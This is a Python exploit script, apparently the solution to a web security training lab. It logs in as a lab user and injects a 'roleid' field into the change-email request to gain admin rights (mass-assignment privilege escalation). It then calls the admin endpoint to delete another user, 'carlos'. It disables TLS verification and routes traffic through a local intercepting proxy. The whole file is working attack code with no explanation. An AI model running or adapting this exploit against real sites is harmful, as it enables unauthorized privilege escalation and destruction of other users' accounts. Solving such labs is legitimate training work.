import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http:' : 'http://127.0.0.1:8080' , 'https:' : 'http://127.0.0.1:8080'}



def deleteUsr(url , s):
    ##& need to login now
    data = {
        'username': 'wiener',
        'password': 'peter'
    }
    loginUrl = url + '/login'
    req = s.post(loginUrl, verify = False , proxies = proxies,data=data)
    res = req.text
    if "Log out" in res:
        print ("(+) Successfully logged in!")
        ## & time for changing the email and role of user
        changeEmailUrl = url + '/my-account/change-email'
        roleData = {
            'email': 'wiener@admin.com',
            'roleid': 2
        }
        req = s.post(changeEmailUrl , json=roleData, verify = False , proxies = proxies)
        res = req.text
        if 'Admin' in res:
            print("(+) Successfully updated role id")
            print ("(+) Trying delete carlos user...")
            deleteCarlosUrl = url + '/admin/delete?username=carlos'
            req = s.get(deleteCarlosUrl , verify = False , proxies = proxies)
            if req.status_code == 200:
                print("(+) Successfully deleted carlos user")
            else:
                print("(+) Can't delete carlos user!")
        else:
            print("Can't get admin panel control")
    else:
        print("Can't Log in to user wiener!")





def main():
    if(len(sys.argv) != 2):
        print ("Usage: %s URL " % sys.argv[0].split("/")[0])
        print ("Example: %s www.example.com" % sys.argv[0].split("/")[0])
        sys.exit(-1)
    print("(+) Finding admin panel...")
    url = sys.argv[1]
    s = requests.Session()
    deleteUsr(url,s)


if __name__ == '__main__':
    main()